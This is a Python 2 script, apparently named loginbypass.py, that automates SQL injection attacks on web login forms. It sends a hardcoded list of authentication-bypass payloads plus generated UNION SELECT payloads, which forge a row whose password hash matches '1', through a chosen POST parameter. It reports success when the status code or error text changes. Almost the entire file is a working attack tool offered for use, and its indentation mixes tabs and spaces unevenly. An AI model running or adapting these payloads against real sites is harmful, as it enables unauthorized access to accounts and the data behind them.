#!/usr/bin/env python
import sys
import urllib
import requests

payload_dict=[]
def_payload_dict=["' or '='", "'or''='", "admin' or ''='", "admin' or '1'='1", "admin'or'1'='1", "admin'--", "admin'/*", "admin'#","system'#","system'/*","system'-- ", "admin'%23", "' or 1%23", "' or 1=1#", "'or 1=1--", "admin' or 1=1--", "admin' or 1=1/*", "admin'/*", "admin') or 1=1--", "admin') or 1=1/*", "admin') or 1=1#", "'='", "'-'", "' or 1=1#", "' or 1=1\xa8C", "')or('a'='a", "1' or '1'='1", "1') or ('1'='1", "1' or 'ab'='a'+'b", "1') or ('ab'='a'+'b", "1' or 'ab'='a' 'b", "1') or('ab'='a' 'b", "1' or 'ab'='a'||'b", "1') or ('ab'='a'||'b"]


post_data={}
dictx=[]
patterncode=''
patterncontent=''
#params='userid=FUZZ&password=1'
#url='http://192.168.254.1:65533/temp/pstu/22/authmain2.php'

def gen_payload(seq='#,/*'):
    global dictx
    for i in range(1,4):
        for j in seq.split(','):
	    #print j,i
            #temp0=','.join('1'*i)
	    temp0=('1,'*i).strip(',')
	    temp="' union select "+temp0
	    temp2=temp+" from authorised_users where '1'='1"  #u can reset the tablename 
	    payload_dict.append(temp2)
            temp1=temp+j
            payload_dict.append(temp1)
	    #print '1:',payload_dict
            
	    templist=temp0.split(',')
	    #print "templist:",templist
	    for z in range(len(templist)):
	        t=templist[z]
		#templist[z]="'c4ca4238a0b923820dcc509a6f75849b'"
		templist[z]="'356a192b7913b04c54574d18c28d46e6395428ab'"
		dictx.append(','.join(templist))
		templist[z]=t
            #print dictx
	    for k in dictx:
	        temp="' union select "+k
		temp2=temp+" from authorised_users where '1'='1"   #u can reset the tablename
                payload_dict.append(temp2)
                temp1=temp+j
                payload_dict.append(temp1)
                #print '2:',payload_dict
            dictx=[]


def geturlcontent(url,postdata,pattern):
    #print postdata
    '''
    cookies=dict()
    cookies['security_level']='0'
    cookies['has_js']='1'
    cookies['PHPSESSID']='98d8fa0b4d6cb55d16686ba86c36c847'
    '''
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0'}
    try:
        #r = requests.post(url=url,data=postdata,headers=headers,cookies=cookies)
        r = requests.post(url=url,data=postdata,headers=headers)
    except:
        print >> sys.stderr,'maybe can\'t connect the website',url
        return
    #r.encoding='utf-8'
    content=r.content
    status_code=r.status_code
    #print type(status_code),status_code

    #print content
    #if content.find('not log you in')==-1:
    if patterncode !='':
        if status_code!=int(pattern):
	    #pass
            print '\033[1;31;40mSuccess,the password is:\033[0m'
	    print 'payload:',post_data
	    print 'postdata:',postdata
	    exit()

    if patterncontent!='':
        #print pattern
	#print content
        #print content.find(pattern)
	#exit()
        if content.find(pattern)==-1:
	    #pass
            print '\033[1;31;40mSuccess,the password is:\033[0m'
	    print 'payload:',post_data
	    print 'postdata:',postdata
	    #exit()
    #status_code=r.status_code
    #print 'content:',content
    #print 'status_code',status_code


def usage():
    print '[option:]'
    print '\033[1;31;40m\tThis script be used to bypass loginform.\n\tThe first parameter is the post url,the second is post data,password must be 1,and fuzz parameter must be FUZZ,the last parameter is the comment symbol '
    print '\twrited by net2net ##############1289675768@qq.com##############'
    print 'Example:'
    print '\tpython loginbypass.py \'http://127.0.0.1/login.php\' \'username=FUZZ&password=1\' \'#,/*,--\' -status 200'
    print '\tpython loginbypass.py \'http://127.0.0.1/login.php\' \'username=FUZZ&password=1\' \'#,/*,--\' -content \'error username and passwd\''

if __name__=="__main__":
    
    if len(sys.argv)==1:
        usage()
        exit()
    elif len(sys.argv)==6:
        url=sys.argv[1]
        params=sys.argv[2]
        endchar=sys.argv[3]
	if sys.argv[4]=='-status':
	    patterncode=int(sys.argv[5])
	if sys.argv[4]=='-content':
	    patterncontent=sys.argv[5]

        gen_payload(endchar)
        #print "dictx:\n",dictx
        #print '##########################'
        #print 'payload_dict:\n',payload_dict,len(payload_dict)
	#for i in payload_dict:
	#   print i
        
        paramslist=params.split('&')
	for i in paramslist:
            b=i.split('=')
            post_data[b[0]]=b[1]
            if b[1]=='FUZZ':
                fuzzparam=b[0]
        for i in payload_dict:
            post_data[fuzzparam]=i
            #print post_data
            geturlcontent(url,urllib.urlencode(post_data),sys.argv[5])
	

        #print post_data
	#print fuzzparam
	#print '###################################################################'
        



        #exit()
	for j in def_payload_dict:
	    post_data[fuzzparam]=j
            geturlcontent(url,urllib.urlencode(post_data),sys.argv[5])

            #print post_data
	#print '###################################################################'
    else:
        print 'input error parameter.\nexit'
	exit()

